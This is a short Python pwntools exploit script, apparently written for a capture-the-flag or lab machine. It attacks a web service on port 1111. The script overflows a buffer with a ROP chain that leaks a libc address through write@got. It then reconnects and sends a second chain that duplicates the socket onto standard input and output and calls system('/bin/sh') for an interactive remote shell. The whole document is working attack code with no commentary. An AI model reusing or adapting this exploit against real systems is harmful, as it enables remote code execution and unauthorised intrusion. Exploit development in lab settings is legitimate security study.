#!/usr/bin/python3
from pwn import remote, p64, u64
from urllib.parse import quote

shell = remote("10.10.10.89", 1111)

offset = 568
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4011dd) # pop rdi; ret;
payload += p64(0x4)      # descriptor
payload += p64(0x4011db) # pop rsi; pop r15; ret;
payload += p64(0x603038) # write@got
payload += p64(0x0)      # padding for pop
payload += p64(0x400c50) # write@plt

shell.sendline(f'GET /{quote(payload)}\n'.encode())
shell.recvuntil(b"not found")

libc_base = u64(shell.recvline()[:8]) - 0x1100f0

shell.close()
shell = remote("10.10.10.89", 1111)

payload  = b""
payload += junk
payload += p64(libc_base + 0x02164f)     # pop rdi; ret;
payload += p64(0x4)                      # oldfd

for i in range(0, 3):
    payload += p64(libc_base + 0x023a6a) # pop rsi; ret;
    payload += p64(i)                    # std
    payload += p64(libc_base + 0x110950) # dup2()

payload += p64(libc_base + 0x02164f)     # pop rdi; ret;
payload += p64(libc_base + 0x1b3d88)     # "/bin/sh"
payload += p64(libc_base + 0x04f420)     # system()

shell.sendline(f'GET /{quote(payload)}\n'.encode())
shell.recvuntil(b"not found")

shell.interactive()
